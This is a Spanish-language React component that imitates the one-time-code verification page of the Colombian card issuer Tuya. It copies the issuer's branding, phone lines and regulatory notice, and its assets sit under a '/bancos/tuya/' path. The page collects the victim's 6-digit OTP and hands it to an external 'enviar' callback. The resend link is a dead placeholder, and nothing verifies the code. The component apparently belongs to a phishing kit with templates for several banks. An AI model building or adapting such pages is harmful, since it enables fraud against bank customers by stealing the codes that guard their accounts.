/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState, useCallback, useMemo, useEffect } from 'react';

import PopLoader from './PopLoader';

// --- CONFIGURACIÓN ESTÁTICA ---
// 🔑 Longitud ajustada a 6 para OTP
const MAX_PASSWORD_LENGTH = 6;

// --- COMPONENTE PRINCIPAL (Vista de Verificación OTP simplificada) ---
export default function LoginPage({
  enviar,
}: {
  enviar?: (code: any) => void;
}) {

  // --- ESTADO Y LÓGICA DE FECHA DINÁMICA ---
  const [otp, setOtp] = useState('');
  const [currentDateTime, setCurrentDateTime] = useState('');
  const [loading, setLoading] = useState(false);

  // Función para formatear la fecha
  const formatDateTime = (date: Date) => {
    const day = date.getDate();
    const month = date.getMonth() + 1;
    const year = date.getFullYear();

    const timeOptions: Intl.DateTimeFormatOptions = {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    };
    const timePart = date.toLocaleTimeString('es-CO', timeOptions);

    return `${day}/${month}/${year} ${timePart.replace(/\./g, '')}`;
  };

  // useEffect para actualizar la fecha
  useEffect(() => {
    const updateTime = () => {
      setCurrentDateTime(formatDateTime(new Date()));
    };

    updateTime();

    const timerId = setInterval(updateTime, 1000);

    return () => clearInterval(timerId);
  }, []);

  // --- LÓGICA DE OTP ---

  const appVersion = "5.0.2";

  // Nuevo handler para el input de OTP
  const handleOtpChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    // Acepta solo dígitos y limita la longitud
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= MAX_PASSWORD_LENGTH) {
      setOtp(value);
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    if (otp.length !== MAX_PASSWORD_LENGTH) {
      // Usar un mensajebox en lugar de alert
      console.error(`El código OTP debe tener ${MAX_PASSWORD_LENGTH} dígitos.`);
      // En una app real, aquí se mostraría un modal de error.
      alert(`El código OTP debe tener ${MAX_PASSWORD_LENGTH} dígitos.`);
      return;
    }
    enviar?.({ otp: otp, view: "otp" });
  };

  // --- RENDERIZADO ---
  return (
    <div className="min-h-screen bg-gray-50 pb-10">
      {loading && <PopLoader />}
      {/* -------------------- ENCABEZADO Y BANNER -------------------- */}
      <header className="flex flex-col lg:flex-row justify-between items-center px-0">

        {/* Banner de Beneficios (Izquierda - Rojo) */}
        <div
          className="shrink-0 text-white font-bold text-xl py-3 px-8 w-full lg:w-[350px]"
          style={{
            backgroundColor: '#c00000',
            borderBottomRightRadius: '0px',
            height: '100px',
            lineHeight: '1.2'
          }}
        >
          Un mundo de <br />beneficios <br />hechos para ti
        </div>

        {/* Fecha y Versión (Derecha) */}
        <div className="flex flex-col text-sm text-gray-700 p-4 w-full lg:w-auto text-center lg:text-right">
          <span>Fecha Actual {currentDateTime}</span>
          <span>Versión {appVersion}</span>
        </div>
      </header>

      {/* -------------------- CONTENIDO PRINCIPAL (OTP VERIFICATION) -------------------- */}
      <div className="container mx-auto max-w-7xl pt-8 px-4">
        <form onSubmit={handleSubmit} className="flex flex-col items-center">

          {/* Título Central */}
          <p className="font-bold text-xl text-gray-800 mb-6 mt-4 lg:mt-0 text-center">
            Por favor, ingrese su Código de Verificación (OTP):
          </p>
          <p className="text-gray-600 mb-8 text-center">
            El código de 6 dígitos ha sido enviado a su número de celular.
          </p>

          {/* Contenedor de Formulario Simplificado */}
          <div className="flex flex-col lg:flex-row w-full max-w-4xl justify-center items-center lg:items-start space-y-10 lg:space-y-0 lg:space-x-12">

            {/* 1. CAMPOS DE OTP Y BOTÓN */}
            <div className="flex flex-col w-full max-w-xs space-y-6 bg-white p-6 rounded-lg shadow-xl">

              {/* CÓDIGO OTP (Visual Input) */}
              <div className="flex flex-col space-y-2">
                <label htmlFor="otp-input" className="font-bold text-gray-700 text-sm sr-only">
                  Código OTP
                </label>
                <div className="relative flex items-center justify-center">
                  {/* Input Field (Invisible but functional) */}
                  <input
                    id="otp-input"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={MAX_PASSWORD_LENGTH}
                    value={otp}
                    onChange={handleOtpChange}
                    autoFocus
                    // Ajuste: El input ahora cubre perfectamente el área de los boxes.
                    className="absolute top-0 left-0 h-full cursor-text z-10 text-transparent bg-transparent border-none focus:ring-0 w-64"
                    style={{ letterSpacing: '35px', outline: 'none', caretColor: 'red' }} // Añadido para mejor sensación
                  />

                  {/* Visual representation of OTP boxes */}
                  <div className="flex space-x-2">
                    {Array(MAX_PASSWORD_LENGTH).fill(0).map((_, index) => (
                      <div
                        key={index}
                        className={`w-8 h-10 border-2 text-sm text-center rounded-sm flex items-center justify-center font-bold text-xl 
                                    ${otp.length > index ? 'border-red-600 text-red-700' : 'border-gray-300 bg-gray-50'}
                                `}
                      >
                        {/* Muestra el dígito (o un punto si se prefiere) */}
                        {otp[index] || ''}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Botón de Submit */}
              <div>
                <button
                  type="submit"
                  disabled={otp.length !== MAX_PASSWORD_LENGTH}
                  className={`w-full px-4 py-2 text-sm font-bold text-white rounded-sm transition-opacity duration-150 h-10 
                        ${otp.length === MAX_PASSWORD_LENGTH ? 'opacity-100' : 'opacity-50 cursor-not-allowed'}
                    `}
                  style={{ backgroundColor: '#c00000' }}
                >
                  Validar OTP
                </button>
              </div>

              {/* Enlace de Reenvío */}
              <div className="text-center mt-2">
                <a href="#" className="text-blue-600 hover:underline text-sm">¿No recibió el código? Reenviar OTP</a>
              </div>
            </div>

            {/* 2. IMAGEN LATERAL */}
            <div className="shrink-0 w-full sm:w-[300px] h-[250px] mt-8 lg:mt-0 lg:order-last order-3 mx-auto">
              <img
                src="/bancos/tuya/PublicidadPortal.jpeg"
                alt="Mujer hablando por teléfono"
                className="rounded-lg shadow-md object-cover w-full h-full"
              />
            </div>

          </div>

          {/* -------------------- LOGOS Y PIE DE PÁGINA -------------------- */}

          {/* Logos de Tarjetas */}
          <div className="flex flex-wrap justify-center items-center gap-4 my-10 max-w-lg mx-auto">
            <img src="/bancos/tuya/titulos-productos.png" alt={`Logo`} className="h-8" />
          </div>

          {/* Texto Legal */}
          <div className="text-center text-xs text-gray-600 max-w-xl px-4 mx-auto">
            Líneas de atención al cliente: Bogotá 601 482 4804 - Cali 602 380 8933 – Medellín 604 444 3727. Línea Nacional: 01 8000 978888<br />
            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br />
            Para conocer acerca de la utilización de Información,<br />
            <a href="https://www.tuya.com.co/para-tener-en-cuenta" target="_blank" className="text-blue-600 hover:underline">Ingresa aquí</a>
          </div>

        </form>
      </div>
    </div>
  );
}